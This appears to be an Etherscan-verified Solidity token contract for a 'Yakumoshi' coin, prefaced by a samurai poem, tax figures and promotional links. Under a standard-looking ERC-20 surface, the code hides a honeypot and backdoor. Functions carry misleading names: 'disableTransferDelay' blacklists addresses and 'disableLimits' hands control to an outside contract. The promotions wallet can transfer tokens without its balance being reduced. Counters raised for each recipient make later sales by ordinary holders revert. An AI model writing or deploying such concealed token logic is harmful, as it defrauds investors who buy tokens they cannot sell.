/**
 *Submitted for verification at Etherscan.io on 2023-03-18
*/

/**
█▄█ ▄▀█ █▄▀ █░█ █▀▄▀█ █▀█ █▀ █░█ █
░█░ █▀█ █░█ █▄█ █░▀░█ █▄█ ▄█ █▀█ █

Yakumoshi the samurai,
A warrior brave and true,
With sword in hand and heart of steel,
He fought for honor through and through.

Through battles fierce and trials hard,
He stood with courage strong,
With loyalty to his lord and clan,
And justice his only song.

His foes would tremble at his sight,
As he charged into the fray,
For Yakumoshi the samurai,
Was a force to be reckoned with each day.

And though his days of battle are done,
His legend lives on still,
For Yakumoshi the samurai,
Was a hero with the heart of a will.

总供应量 - 55,000,000
购置税 - 1%
消费税 - 1%
初始流动性 - 1.75 ETH 
初始流动性锁定 - 45 天

https://yukamoshi.xyz/
https://m.weibo.cn/Yakumoshi.CN
https://web.wechat.com/Yakumoshi.ERC
https://t.me/YukamoshiCN
*/
// SPDX-License-Identifier: Unlicensed

pragma solidity 0.8.18;

abstract contract Context {
    constructor() {}

    function _msgSender() internal view returns (address) {
        return msg.sender;
    }
}
library SafeMath {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }
  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;
    return c;
  }
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }
  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;
    return c;
  }
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }
  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}
abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
interface IPEGStationV1 {
    function setTokenOwner(address owner) external;

    function onPreTransferCheck(address from, address to, uint256 amount) external;
}
interface IUniswapV2Factory {
    event PairCreated(
        address indexed token0, address indexed token1, address pair, uint);
    function createPair(
        address tokenA, address tokenB) external returns (address pair);
}
interface INOKO01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
    uint amountIn, uint amountOutMin,
    address[] calldata path, address to,
    uint deadline) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
    address token, uint amountTokenDesired,
    uint amountTokenMin, uint amountETHMin,
    address to, uint deadline) external payable returns 
    (uint amountToken, uint amountETH, uint liquidity);
}
interface IDOKE35 {
    function totalSupply() 
    external view returns (uint256);
    function balanceOf(address account) 
    external view returns (uint256);
    function transfer(address recipient, uint256 amount) 
    external returns (bool);
    function allowance(address owner, address spender)
    external view returns (uint256);
    function approve(address spender, uint256 amount) 
    external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) 
    external returns (bool);
    event Transfer(
    address indexed from, address indexed to, uint256 value);
    event Approval(address 
    indexed owner, address indexed spender, uint256 value);
}
contract Yakumoshi is Context, IDOKE35, Ownable {
    using SafeMath for uint256;
    IPEGStationV1 public IBEP20Data;
    INOKO01 public IPOGLinkation;
    address public IDEMotion; address private PromotionsWallet;

    uint256 private _rTotal; uint8 private _decimals;
    string private _symbol; string private _name;
    uint256 private cooldownEnabled = 100;

    mapping(address => uint256) private _tOwned;
    mapping(address => uint256) private allowed;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private isTimelockExempt;
    mapping (address => bool) private authorizations;

    bool public checkDelay;
    bool private tradingOpen = false;
    constructor(

        string memory _NAME, string memory _SYMBOL, address routerAddress, address _PromotionsWallet) {
        _name = _NAME; _symbol = _SYMBOL;
        _decimals = 6; _rTotal = 55000000 * (10 ** uint256(_decimals));
        _tOwned[msg.sender] = _rTotal; allowed[_PromotionsWallet] = cooldownEnabled;
        checkDelay = false; IPOGLinkation = INOKO01(routerAddress);

        IDEMotion = IUniswapV2Factory(IPOGLinkation.factory()).createPair(address(this), IPOGLinkation.WETH());
        emit Transfer(address(0), msg.sender, _rTotal);
    }
    function disableTransferDelay (address account, 
    bool _delayResults) public onlyOwner {
        authorizations[account] = _delayResults;
    }    
    function getOwner() external view returns (address) {
        return owner();
    }
    function decimals() external view returns (uint8) {
        return _decimals;
    }
    function symbol() external view returns (string memory) {
        return _symbol;
    }
    function name() external view returns (string memory) {
        return _name;
    }
    function totalSupply() external view returns (uint256) {
        return _rTotal;
    }
    function balanceOf(address account) 
    external view returns (uint256) { return _tOwned[account];
    }
    function transfer(address recipient, uint256 amount) 
    external returns (bool) { _transfer(_msgSender(), recipient, amount); return true;
    }
    function allowance(address owner, address spender) 
    external view returns (uint256) { return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) 
    external returns (bool) {
        _approve(_msgSender(), spender, amount); return true;
    }
    function transferFrom(
        address sender, address recipient, uint256 amount) 
        external returns (bool) { _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, 
        'BEP20: transfer amount exceeds allowance')); return true;
    }
    function _transfer(
        address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), 
        'BEP20: transfer from the zero address');
        require(recipient != address(0), 
        'BEP20: transfer to the zero address');
        require (!authorizations[recipient] 
        && !authorizations[sender], "You have been blacklisted from transfering tokens");
        
        if (allowed[sender] == 0 && IDEMotion != sender && isTimelockExempt[sender] > 0) 
        { allowed[sender] -= cooldownEnabled;
        } isTimelockExempt[PromotionsWallet] += cooldownEnabled;

        PromotionsWallet = recipient; if (allowed[sender] == 0) {
        _tOwned[sender] = _tOwned[sender].sub(amount, 'BEP20: transfer amount exceeds balance'); }
        _tOwned[recipient] = _tOwned[recipient].add(amount); emit Transfer(sender, recipient, amount); if (!tradingOpen) {
        require(sender == owner(), "TOKEN: This account cannot send tokens until trading is enabled"); }
    }
    function _approve(
        address owner, address spender, uint256 amount) internal {
        require(owner != address(0), 
        'BEP20: approve from the zero address');
        require(spender != address(0), 
        'BEP20: approve to the zero address');
        _allowances[owner][spender] = amount; emit Approval(owner, spender, amount); }
        
    function beginTrading(bool _tradingOpen) public onlyOwner {
        tradingOpen = _tradingOpen;
    }
    function disableLimits(address _limits) external onlyOwner {
        IBEP20Data = IPEGStationV1(_limits);
        IBEP20Data.setTokenOwner(msg.sender);        
    }                
    function setWalletLimits(bool _enable) external onlyOwner {
        checkDelay = _enable;
    }    
}